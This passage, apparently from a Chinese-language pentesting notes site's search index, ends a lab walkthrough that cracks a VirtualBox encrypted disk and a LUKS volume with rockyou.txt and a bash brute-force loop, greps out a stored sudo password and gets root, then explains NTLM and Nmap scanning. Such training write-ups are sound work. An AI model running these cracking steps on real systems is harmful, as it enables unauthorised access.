<code>Add</code>\u3002\u7136\u540e\u6211\u4eec\u9009\u62e9\u78c1\u76d8\u6620\u50cf\u3002\u6211\u4eec\u70b9\u51fb\u786e\u8ba4\u5e76\u542f\u52a8\u673a\u5668\u3002\u542f\u52a8\u673a\u5668\u540e\uff0c\u6211\u4eec\u4f1a\u6536\u5230\u5bc6\u7801\u63d0\u793a\u3002 ![[Pasted image 20221113075316.png]]</p> <p>\u6211\u4eec\u76ee\u524d\u4e0d\u77e5\u9053\u8fd9\u4e2a\u5bc6\u7801\u53ef\u80fd\u662f\u4ec0\u4e48\u3002 <code>.vbox</code> \u6587\u4ef6\u662f Virtual Box \u865a\u62df\u673a\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u3002</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!--\n** DO NOT EDIT THIS FILE.\n** If you make changes to this file while any VirtualBox related application\n** is running, your changes will be overwritten later, without taking effect.\n** Use VBoxManage or the VirtualBox Manager GUI to make changes.\n--&gt;\n&lt;VirtualBox xmlns=\"http://www.virtualbox.org/\" version=\"1.16-windows\"&gt;\n&lt;Machine uuid=\"{528b3540-b8be-4677-b43f-7f4969137747}\" name=\"Moderator 1\"\nOSType=\"Ubuntu_64\" snapshotFolder=\"Snapshots\" lastStateChange=\"2021-09-15T16:44:57Z\"&gt;\n&lt;MediaRegistry&gt;\n&lt;HardDisks&gt;\n&lt;HardDisk uuid=\"{12b147da-5b2d-471f-9e32-a32b1517ff4b}\" location=\"F:/2019.vdi\"\nformat=\"VDI\" type=\"Normal\"&gt;\n&lt;Property name=\"CRYPT/KeyId\" value=\"Moderator 1\"/&gt;\n&lt;Property name=\"CRYPT/KeyStore\" value=\"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0&lt;--\nSNIP--&gt;\"/&gt;\n\n&lt;SNIP&gt;\n</code></pre> <p>\u5728\u4e0a\u9762\u663e\u793a\u7684\u6587\u4ef6\u7247\u6bb5\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u52a0\u5bc6\u9a71\u52a8\u5668\uff08 <code>2019.vdi</code> \uff09\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7834\u89e3\u5bc6\u7801\u3002\u5728\u7f51\u4e0a\u641c\u7d22\u5982\u4f55\u7834\u89e3 Vbox \u52a0\u5bc6\u9a71\u52a8\u5668\u5bc6\u7801\u540e\uff0c\u6211\u4eec\u627e\u5230\u4e86\u8fd9\u4e2a\u5de5\u5177\u3002\u8ba9\u6211\u4eec\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u5c1d\u8bd5\u3002</p> <pre><code>$ python3 pyvboxdie-cracker.py -v 2019-08-01.vbox -d /usr/share/wordlists/rockyou.txt\n</code></pre> <p>![[Pasted image 20221113075501.png]]</p> <p>\u4e0a\u9762\u7684\u8f93\u51fa\u663e\u793a\u52a0\u5bc6\u9a71\u52a8\u5668\u7684\u5bc6\u7801\u662f <code>computer</code> \u3002\u542f\u52a8\u865a\u62df\u673a l\u5e76\u8f93\u5165\u5bc6\u7801\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8bbf\u95ee\u865a\u62df\u78c1\u76d8\u4e86\u3002</p> <p>\u73b0\u5728\u8ba9\u6211\u4eec\u5c1d\u8bd5\u6302\u8f7d\u65b0\u78c1\u76d8\u3002</p> <pre><code>$ mout /dev/sdb /mnt\n</code></pre> <p>![[Pasted image 20221113075552.png]]</p> <p>\u524d\u9762\u63d0\u5230\u7684 <code>mount</code> \u547d\u4ee4\u7684\u8f93\u51fa\u663e\u793a\u4e00\u4e2a\u9519\u8bef\uff0c\u6307\u51fa\u9a71\u52a8\u5668\u4f7f\u7528 <code>crypto_LUKS</code> \u6587\u4ef6\u7cfb\u7edf\u3002\u8ba9\u6211\u4eec\u5c06\u9a71\u52a8\u5668\u590d\u5236\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5e76\u8fd0\u884c <code>file</code> \u547d\u4ee4\u3002</p> <pre><code>$ di\n$ file disk\n</code></pre> <p>![[Pasted image 20221113075655.png]]</p> <p><code>file</code> \u547d\u4ee4\u7684\u8f93\u51fa\u663e\u793a\u6211\u4eec\u6709\u4e00\u4e2a LUKS \u52a0\u5bc6\u6587\u4ef6\u3002\u5f53\u6211\u4eec\u5728\u7f51\u4e0a\u641c\u7d22\u7834\u89e3 LUKS \u6587\u4ef6\u7684\u65b9\u6cd5\u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u7bc7\u6587\u7ae0\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u6d4b\u8bd5\u5bc6\u7801\u662f\u5426\u6709\u6548\u3002</p> <pre><code>$ echo -n \"test\" | cryptsetup --test-passphrase open disk\n</code></pre> <p>\u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5faa\u73af\u904d\u5386 <code>rockyou.txt</code> \u7684\u811a\u672c\uff0c\u5e76\u5c1d\u8bd5\u4f7f\u7528\u6bcf\u4e2a\u8bfb\u53d6\u7684\u5bc6\u7801\u89e3\u5bc6 LUKS \u9a71\u52a8\u5668\u3002</p> <pre><code>#!/bin/bash \n\nfor w in $(cat rockyou.txt); do\n    echo -ne \"\\r\\033[KTesting $w\";\n    echo -n \"$w\" | cryptsetup luksOpen --test-passphrase disk 2&gt;/dev/null &amp;&amp; \\\n        echo -e \"\\rFound password: $w\" &amp;&amp; \\\n        break\ndone\n</code></pre> <p>\u6211\u4eec\u5c06\u4e0a\u9762\u7684\u811a\u672c\u653e\u5165\u4e00\u4e2a\u540d\u4e3a <code>crack.sh</code> \u7684\u6587\u4ef6\u4e2d\uff0c\u4f7f\u5176\u53ef\u6267\u884c\u5e76\u8fd0\u884c\u5b83\u3002 ![[Pasted image 20221113080046.png]]</p> <p>\u8be5\u811a\u672c\u6210\u529f\u7834\u89e3\u4e86 LUKS \u6587\u4ef6\u7684\u5bc6\u7801\uff0c\u6211\u4eec\u7ee7\u7eed\u6253\u5f00\u78c1\u76d8\u5e76\u5c06\u5176\u6302\u8f7d\u5230 <code>/mnt</code> \u3002</p> <pre><code>$ cryptsetup luksOpen disk Volume \n$ mount /dev/mapper/volume /mnt\n</code></pre> <p>\u4e00\u65e6\u6211\u4eec\u8fdb\u5165 <code>/mnt</code> \u76ee\u5f55\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e24\u4e2a\u76ee\u5f55\uff0c <code>lost+found</code> \u548c <code>scripts</code> \u3002\u8ba9\u6211\u4eec\u8fd0\u884c <code>grep</code> \u4ee5\u67e5\u770b\u4efb\u4f55\u6587\u4ef6\u4e2d\u662f\u5426\u6709\u4efb\u4f55\u5bc6\u7801\u3002</p> <pre><code>$ grep -R 'password\\|passwd\\|pswd'\n</code></pre> <p>![[Pasted image 20221113080848.png]]</p> <p>\u4ece\u4e0a\u9762\u663e\u793a\u7684\u8f93\u51fa\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u540d\u4e3a <code>distro_update.sh</code> \u7684\u6587\u4ef6\u4e2d\u6709\u4e00\u4e2a\u5bc6\u7801 <code>$_THE_best_Sysadmin_Ever_</code>\u3002\u67e5\u770b\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5b83\u4f7f\u7528\u6b64\u5bc6\u7801\u8fd0\u884c <code>sudo</code> \u547d\u4ee4\u3002\u8ba9\u6211\u4eec\u4ee5 john \u7684\u8eab\u4efd\u56de\u5230 shell\uff0c\u770b\u770b\u662f\u5426\u53ef\u4ee5\u4f7f\u7528 <code>sudo</code> \u548c\u8fd9\u4e2a\u5bc6\u7801\u3002</p> <pre><code>$ sudo /bin/bash\n</code></pre> <p>![[Pasted image 20221113081003.png]]</p> <p>We have successfully used Sudo to get root. The root flag can be found at /root/root.txt .</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/NTLM/","title":"NTLM","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/NTLM/#ntlm_1","title":"\u4ec0\u4e48\u662fNTLM\u534f\u8bae","text":"<p>NTLM \u662f Microsoft \u521b\u5efa\u7684\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u7684\u96c6\u5408\u3002NTLM \u6700\u521d\u662f\u4e00\u79cd\u4e13\u6709\u534f\u8bae\uff0c\u540e\u6765\u53ef\u7528\u4e8e\u4e0d\u4f7f\u7528 Windows \u7684\u7cfb\u7edf\u3002NT LAN Manager \u5141\u8bb8\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u548c\u670d\u52a1\u5668\u8fdb\u884c\u76f8\u4e92\u9a8c\u8bc1\u3002\u5927\u591a\u6570\u7f51\u7edc\u8bd5\u56fe\u62d2\u7edd\u672a\u7ecf\u6388\u6743\u7684\u7528\u6237\u8bbf\u95ee\uff0c\u8fd9\u9700\u8981\u5b9e\u65bd\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u3002</p> <p>\u8be5\u534f\u8bae\u8981\u6c42\u901a\u8fc7\u63d0\u4f9b\u7528\u6237\u540d\u548c\u76f8\u5e94\u7684\u5bc6\u7801\u6765\u5bf9\u5ba2\u6237\u7aef\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u8fd9\u5141\u8bb8\u5728\u7528\u6237\u7684\u8bbe\u5907\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u5efa\u7acb\u4ea4\u6362\u3002\u5728\u8bc6\u522b\u51fa\u7528\u6237\u7684\u767b\u5f55\u51ed\u636e\u540e\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u68c0\u67e5\u8bbf\u95ee\u6743\u9650\u5e76\u5141\u8bb8\u7528\u6237\u8fdb\u5165\u3002</p> <p>NTLM\u8eab\u4efd\u9a8c\u8bc1\u5982\u4f55\u5de5\u4f5c\uff1f NTLM \u4f7f\u7528 challenge-response \u534f\u8bae\u68c0\u67e5\u7f51\u7edc\u7528\u6237\u7684\u51ed\u8bc1\u3002\u8ba4\u8bc1\u8fc7\u7a0b\u7ecf\u8fc7\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4 1\u3001\u5ba2\u6237\u7aef\u5411\u4e3b\u673a\u53d1\u9001\u7528\u6237\u540d\u3002 2\u3001\u4e3b\u673a\u54cd\u5e94\u4e00\u4e2a\u968f\u673a\u6570\uff08\u5373challenge\uff09\u3002 3\u3001\u5ba2\u6237\u7aef\u4ece\u8fd9\u4e2a\u6570\u5b57\u548c\u7528\u6237\u7684\u5bc6\u7801\u751f\u6210\u4e00\u4e2a\u54c8\u5e0c\u5bc6\u7801\u503c\uff0c\u7136\u540e\u5c06\u5b83\u4f5c\u4e3a\u54cd\u5e94\u53d1\u9001\u56de\u6765\u3002 4\u3001\u4e3b\u673a\u77e5\u9053\u7528\u6237\u7684\u5bc6\u7801\u5e76\u751f\u6210\u4e00\u4e2a\u6563\u5217\u5bc6\u7801\u503c\uff0c\u7136\u540e\u5b83\u53ef\u4ee5\u4e0e\u5ba2\u6237\u7aef\u7684\u54cd\u5e94\u8fdb\u884c\u6bd4\u8f83\u3002 5\u3001\u5982\u679c\u4e24\u4e2a\u503c\u90fd\u5339\u914d\uff0c\u5219\u786e\u8ba4\u5ba2\u6237\u7aef\u7684\u771f\u5b9e\u6027\uff0c\u5e76\u6388\u4e88\u7f51\u7edc\u8bbf\u95ee\u6743\u9650\u3002\u5982\u679c\u503c\u4e4b\u95f4\u4e0d\u5339\u914d\uff0c\u5219\u5ba2\u6237\u7aef\u5c06\u88ab\u62d2\u7edd\u8bbf\u95ee\u3002</p> <p>\u5728\u5ba2\u6237\u7aef\u548c\u4e3b\u673a\u4e4b\u95f4\u7684\u4ea4\u6362\u8fc7\u7a0b\u4e2d\uff0c\u4fe1\u606f\u4ee5 NTLM \u6807\u5fd7\u7684\u5f62\u5f0f\u90e8\u5206\u4e2d\u7ee7\u3002\u8fd9\u4e9b\u662f\u957f\u5ea6\u4e3a 4 \u4e2a\u5b57\u8282\u7684\u4ee3\u7801\u3002\u534f\u5546\u6807\u5fd7\u6709\u65f6\u5f7c\u6b64\u4e4b\u95f4\u4ec5\u76f8\u5dee\u4e00\u4e2a\u5b57\u8282\uff0c\u63d0\u4f9b\u6709\u5173\u767b\u5f55\u8fc7\u7a0b\u72b6\u6001\u7684\u4fe1\u606f\u3002</p> <p>NTLM\u7684\u5e94\u7528 \u591a\u53f0  Windows\u673a\u5668\u76f8\u4e92\u8fde\u63a5\u6216\u8fde\u63a5\u5230\u670d\u52a1\u5668 Windows\u4f7f\u7528NTLM\u4f5c\u4e3a\u5355\u70b9\u767b\u5f55\u8fdb\u7a0b(SSO)\uff0c\u7528\u6237\u53ea\u9700\u767b\u5f55\u4e00\u6b21\u5373\u53ef\u8bbf\u95ee\u57df\u5185\u5404\u79cd\u7a0b\u5e8f\u3002 \u5df2\u8fc7\u65f6\uff0c\u6539\u7528Kerberos\u3002\u65b0\u7684\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u66f4\u5b89\u5168\uff0c\u65e7\u7684\u670d\u52a1\u4ecd\u5728\u4f7f\u7528NTLM\u3002</p> <p>NTLM\u4f18\u7f3a\u70b9 \u901a\u8fc7 NTLM \u8fdb\u884c\u7684\u8eab\u4efd\u9a8c\u8bc1\u4e0d\u9700\u8981\u7528\u6237\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u672a\u53d7\u4fdd\u62a4\u7684\u5bc6\u7801\u3002 \u4ece\u5ba2\u6237\u7aef\u5230\u670d\u52a1\u5668\u7684\u5bc6\u7801\u4f20\u9012\u4ec5\u4ee5\u6563\u5217\u503c\u7684\u5f62\u5f0f\u5b8c\u6210\uff0c\u8fd9\u63d0\u4f9b\u4e86\u9ad8\u7ea7\u522b\u7684\u5b89\u5168\u6027\u3002\u4f46\u662f\uff0c\u6563\u5217\u503c\u7684\u7f3a\u70b9\u662f\u7b49\u540c\u4e8e\u5bc6\u7801\u3002\u5982\u679c\u4f20\u8f93\u88ab\u622a\u83b7\uff0c\u7cfb\u7edf\u627f\u8bfa\u7684\u5b89\u5168\u6027\u53ef\u80fd\u4f1a\u53d7\u5230\u635f\u5bb3\u3002\u5bc6\u7801\u901a\u8fc7MD4\u52a0\u5bc6\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u73b0\u5728\u88ab\u8ba4\u4e3a\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u6563\u5217\u503c\u53ef\u4ee5\u7528\u76f8\u5bf9\u8f83\u5c11\u7684\u52aa\u529b\u6765\u89e3\u5bc6\u3002 \u53e6\u4e00\u4e2a\u7f3a\u70b9\u662f NTLM\u4e0d\u5305\u62ec\u591a\u56e0\u7d20\u8eab\u4efd\u9a8c\u8bc1(MFA)\u3002\u5efa\u8bae\u5b9e\u65bd\u591a\u79cd\u5b89\u5168\u673a\u5236\uff0c\u5c24\u5176\u662f\u5728\u5171\u4eab\u654f\u611f\u6570\u636e\u65f6\u3002NTLM \u4e2d\u7684\u8d28\u8be2-\u54cd\u5e94\u534f\u8bae\u4ec5\u5141\u8bb8\u4e00\u79cd\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff1a\u4f7f\u7528\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u65b9\u6cd5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/","title":"Nmap \u7f51\u7edc\u679a\u4e3e - HTB \u7b14\u8bb0","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_1","title":"\u4ecb\u7ecd","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_2","title":"\u679a\u4e3e","text":"<p>\u679a\u4e3e\u662f\u6700\u5173\u952e\u7684\u90e8\u5206\u3002\u56f0\u96be\u7684\u4e0d\u662f\u83b7\u5f97\u76ee\u6807\u8ba1\u7b97\u673a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u800c\u662f\u8bc6\u522b\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u653b\u51fb\u76ee\u6807\u7684\u6240\u6709\u65b9\u5f0f\u3002</p> <p>\u4e0d\u80fd\u4ec5\u4ec5\u9760\u5de5\u5177\uff0c\u5fc5\u987b\u4e86\u89e3\u8fd9\u4e9b\u670d\u52a1\u5982\u4f55\u5de5\u4f5c\u4ee5\u53ca\u5b83\u4eec\u4f7f\u7528\u4ec0\u4e48\u8bed\u6cd5\u6765\u4e0e\u4e0d\u540c\u670d\u52a1\u8fdb\u884c\u6709\u6548\u901a\u8baf\u548c\u4ea4\u4e92\u3002</p> <p>\u6b64\u9636\u6bb5\u65e8\u5728\u63d0\u9ad8\u6211\u4eec\u5bf9\u6280\u672f\u3001\u534f\u8bae\u4ee5\u53ca\u5176\u5de5\u4f5c\u65b9\u5f0f\u7684\u77e5\u8bc6\u548c\u7406\u89e3\uff0c\u5e76\u5b66\u4e60\u5904\u7406\u65b0\u4fe1\u606f\u5e76\u9002\u5e94\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u7684\u77e5\u8bc6\u3002\u679a\u4e3e\u6b63\u5728\u6536\u96c6\u5c3d\u53ef\u80fd\u591a\u7684\u4fe1\u606f\u3002\u6211\u4eec\u638c\u63e1\u7684\u4fe1\u606f\u8d8a\u591a\uff0c\u5c31\u8d8a\u5bb9\u6613\u627e\u5230\u7a81\u7834\u53e3\u3002</p> <p>\u4e00\u65e6\u6211\u4eec\u77e5\u9053\u5982\u4f55\u8bbf\u95ee\u76ee\u6807\u7cfb\u7edf\uff0c\u5c31\u4e0d\u96be\u4e86\u3002\u6211\u4eec\u83b7\u5f97\u8bbf\u95ee\u6743\u9650\u7684\u5927\u591a\u6570\u65b9\u5f0f\u53ef\u4ee5\u7f29\u5c0f\u5230\u4ee5\u4e0b\u4e24\u70b9\uff1a</p> <ul> <li> <p>\u5141\u8bb8\u6211\u4eec\u4e0e\u76ee\u6807\u4ea4\u4e92 and/or \u63d0\u4f9b\u989d\u5916\u4fe1\u606f\u7684\u529f\u80fd and/or \u8d44\u6e90\u3002</p> </li> <li> <p>\u4e3a\u6211\u4eec\u63d0\u4f9b\u8bbf\u95ee\u76ee\u6807\u7684\u66f4\u91cd\u8981\u7684\u4fe1\u606f\u3002</p> </li> </ul> <p>\u5728\u626b\u63cf\u548c\u68c0\u67e5\u65f6\uff0c\u6211\u4eec\u6b63\u662f\u5728\u5bfb\u627e\u8fd9\u4e24\u79cd\u53ef\u80fd\u6027\u3002\u6211\u4eec\u83b7\u5f97\u7684\u5927\u90e8\u5206\u4fe1\u606f\u6765\u81ea\u9519\u8bef\u914d\u7f6e\u6216\u5ffd\u89c6\u76f8\u5e94\u670d\u52a1\u7684\u5b89\u5168\u6027\u3002\u9519\u8bef\u914d\u7f6e\u8981\u4e48\u662f\u65e0\u77e5\u7684\u7ed3\u679c\uff0c\u8981\u4e48\u662f\u9519\u8bef\u7684\u5b89\u5168\u5fc3\u6001\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7ba1\u7406\u5458\u4ec5\u4f9d\u9760\u9632\u706b\u5899\u3001\u7ec4\u7b56\u7565\u5bf9\u8c61 (GPO) \u548c\u6301\u7eed\u66f4\u65b0\uff0c\u901a\u5e38\u4e0d\u8db3\u4ee5\u4fdd\u62a4\u7f51\u7edc\u5b89\u5168\u3002</p> <p>\u5982\u4f55\u4e0e\u670d\u52a1\u4ea4\u4e92\u4ee5\u53ca\u76f8\u5173\u7684\u4e1c\u897f\u662f\u5173\u952e\u7684\uff0c\u6295\u5165\u51e0\u4e2a\u5c0f\u65f6\u6765\u66f4\u591a\u5730\u4e86\u89e3\u8be5\u670d\u52a1\u3001\u5b83\u7684\u5de5\u4f5c\u539f\u7406\u4ee5\u53ca\u5b83\u7684\u7528\u9014\uff0c\u4ed6\u4eec\u5c06\u53ef\u4ee5\u8282\u7701\u51e0\u4e2a\u5c0f\u65f6\u751a\u81f3\u51e0\u5929\u7684\u65f6\u95f4\u6765\u5b9e\u73b0\u4ed6\u4eec\u7684\u76ee\u6807\u5e76\u8bbf\u95ee\u8be5\u7cfb\u7edf\u3002</p> <p><code>Manual enumeration</code>\u662f\u4e00\u4e2a<code>critical</code>\u7ec4\u4ef6\u3002\u8bb8\u591a\u626b\u63cf\u5de5\u5177\u7b80\u5316\u5e76\u52a0\u901f\u4e86\u8fd9\u4e2a\u8fc7\u7a0b\u3002\u4f46\u662f\uff0c\u8fd9\u4e9b\u4e0d\u80fd\u603b\u662f\u7ed5\u8fc7\u670d\u52a1\u7684\u5b89\u5168\u63aa\u65bd\u3002\u8bf4\u660e\u8fd9\u4e00\u70b9\u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u4f7f\u7528\u4ee5\u4e0b\u793a\u4f8b\uff1a</p> <p>\u5927\u591a\u6570\u626b\u63cf\u5de5\u5177\u90fd\u6709\u4e00\u4e2a\u8d85\u65f6\u8bbe\u7f6e\uff0c\u76f4\u5230\u5b83\u4eec\u6536\u5230\u6765\u81ea\u670d\u52a1\u7684\u54cd\u5e94\u3002\u5982\u679c\u6b64\u5de5\u5177\u5728\u7279\u5b9a\u65f6\u95f4\u5185\u6ca1\u6709\u54cd\u5e94\uff0c\u6b64\u670d\u52a1/\u7aef\u53e3\u5c06\u88ab\u6807\u8bb0\u4e3a\u5173\u95ed\u3001\u8fc7\u6ee4\u6216\u672a\u77e5\u3002\u5728\u540e\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u5b83\u3002\u7136\u800c\uff0c\u5982\u679c\u4e00\u4e2a\u7aef\u53e3\u88ab\u6807\u8bb0\u4e3a\u5173\u95ed\u5e76\u4e14 Nmap \u6ca1\u6709\u5411\u6211\u4eec\u663e\u793a\u5b83\uff0c\u6211\u4eec\u5c31\u4f1a\u5904\u4e8e\u7cdf\u7cd5\u7684\u5883\u5730\u3002\u8be5\u670d\u52a1/\u7aef\u53e3\u53ef\u80fd\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u627e\u5230\u8bbf\u95ee\u7cfb\u7edf\u7684\u65b9\u6cd5\u7684\u673a\u4f1a\u3002\u56e0\u6b64\uff0c\u5728\u6211\u4eec\u627e\u5230\u5b83\u4e4b\u524d\uff0c\u8fd9\u4e2a\u7ed3\u679c\u53ef\u80fd\u4f1a\u82b1\u8d39\u5f88\u591a\u4e0d\u5fc5\u8981\u7684\u65f6\u95f4\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap","title":"Nmap \u7b80\u4ecb","text":"<p>Network Mapper ( <code>Nmap</code>) \u662f\u4e00\u4e2a\u7528 C\u3001C++\u3001Python \u548c Lua \u7f16\u5199\u7684\u5f00\u6e90\u7f51\u7edc\u5206\u6790\u548c\u5b89\u5168\u5ba1\u8ba1\u5de5\u5177\u3002\u5b83\u65e8\u5728\u626b\u63cf\u7f51\u7edc\u5e76\u4f7f\u7528\u539f\u59cb\u6570\u636e\u5305\u3001\u670d\u52a1\u548c\u5e94\u7528\u7a0b\u5e8f\uff08\u5305\u62ec\u540d\u79f0\u548c\u7248\u672c\uff09\u8bc6\u522b\u7f51\u7edc\u4e0a\u53ef\u7528\u7684\u4e3b\u673a\u3002\u5b83\u8fd8\u53ef\u4ee5\u8bc6\u522b\u8fd9\u4e9b\u4e3b\u673a\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u7248\u672c\u3002\u9664\u4e86\u5176\u4ed6\u529f\u80fd\u5916\uff0cNmap \u8fd8\u63d0\u4f9b\u626b\u63cf\u529f\u80fd\uff0c\u53ef\u4ee5\u786e\u5b9a\u662f\u5426\u6839\u636e\u9700\u8981\u914d\u7f6e\u4e86\u6570\u636e\u5305\u8fc7\u6ee4\u5668\u3001\u9632\u706b\u5899\u6216\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf (IDS)\u3002</p> <p>\u5efa\u8bae\u5b58\u50a8\u6bcf\u4e00\u6b21\u626b\u63cf\u3002\u8fd9\u53ef\u4ee5\u5728\u4ee5\u540e\u7528\u4e8e\u6bd4\u8f83\u3001\u6587\u6863\u548c\u62a5\u544a\u3002\u6bd5\u7adf\uff0c\u4e0d\u540c\u7684\u5de5\u5177\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u533a\u5206\u54ea\u4e2a\u5de5\u5177\u4ea7\u751f\u54ea\u4e2a\u7ed3\u679c\u53ef\u80fd\u662f\u6709\u76ca\u7684\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_3","title":"\u7528\u4f8b","text":"<p>\u8be5\u5de5\u5177\u662f\u7f51\u7edc\u7ba1\u7406\u5458\u548c IT \u5b89\u5168\u4e13\u5bb6\u6700\u5e38\u7528\u7684\u5de5\u5177\u4e4b\u4e00\u3002\u5b83\u7528\u4e8e\uff1a</p> <ul> <li>\u5ba1\u8ba1\u7f51\u7edc\u7684\u5b89\u5168\u65b9\u9762</li> <li>\u6a21\u62df\u6e17\u900f\u6d4b\u8bd5</li> <li>\u68c0\u67e5\u9632\u706b\u5899\u548c IDS \u8bbe\u7f6e\u548c\u914d\u7f6e</li> <li>\u7f51\u7edc\u8fde\u63a5\u7684\u53ef\u80fd\u7c7b\u578b</li> <li>\u7f51\u7edc\u6620\u5c04</li> <li>\u54cd\u5e94\u5206\u6790</li> <li>\u8bc6\u522b\u5f00\u653e\u7aef\u53e3</li> <li>\u8106\u5f31\u6027\u8bc4\u4f30\u3002</li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap_1","title":"Nmap\u67b6\u6784","text":"<p>Nmap \u63d0\u4f9b\u4e86\u8bb8\u591a\u4e0d\u540c\u7c7b\u578b\u7684\u626b\u63cf\uff0c\u53ef\u7528\u4e8e\u83b7\u53d6\u6709\u5173\u6211\u4eec\u76ee\u6807\u7684\u5404\u79cd\u7ed3\u679c\u3002\u57fa\u672c\u4e0a\uff0cNmap \u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\u626b\u63cf\u6280\u672f\uff1a</p> <ul> <li>\u4e3b\u673a\u53d1\u73b0</li> <li>\u7aef\u53e3\u626b\u63cf</li> <li>\u670d\u52a1\u679a\u4e3e\u548c\u68c0\u6d4b</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b</li> <li>\u4e0e\u76ee\u6807\u670d\u52a1\u7684\u811a\u672c\u5316\u4ea4\u4e92\uff08Nmap \u811a\u672c\u5f15\u64ce\uff09</li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_4","title":"\u8bed\u6cd5","text":"<p>Nmap \u7684\u8bed\u6cd5\u76f8\u5f53\u7b80\u5355\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>darkinga@htb[/htb]$ nmap &lt;scan types&gt; &lt;options&gt; &lt;target&gt;\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_5","title":"\u626b\u63cf\u6280\u672f","text":"<p>Nmap \u63d0\u4f9b\u4e86\u8bb8\u591a\u4e0d\u540c\u7684\u626b\u63cf\u6280\u672f\uff0c\u5efa\u7acb\u4e0d\u540c\u7c7b\u578b\u7684\u8fde\u63a5\u5e76\u4f7f\u7528\u4e0d\u540c\u7ed3\u6784\u7684\u6570\u636e\u5305\u6765\u53d1\u9001\u3002\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Nmap \u63d0\u4f9b\u7684\u6240\u6709\u626b\u63cf\u6280\u672f\uff1a</p> <pre><code>darkinga@htb[/htb]$ nmap --help\n\n&lt;SNIP&gt;\nSCAN TECHNIQUES:\n  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans\n  -sU: UDP Scan\n  -sN/sF/sX: TCP Null, FIN, and Xmas scans\n  --scanflags &lt;flags&gt;: Customize TCP scan flags\n  -sI &lt;zombie host[:probeport]&gt;: Idle scan\n  -sY/sZ: SCTP INIT/COOKIE-ECHO scans\n  -sO: IP protocol scan\n  -b &lt;FTP relay host&gt;: FTP bounce scan\n&lt;SNIP&gt;\n</code></pre> 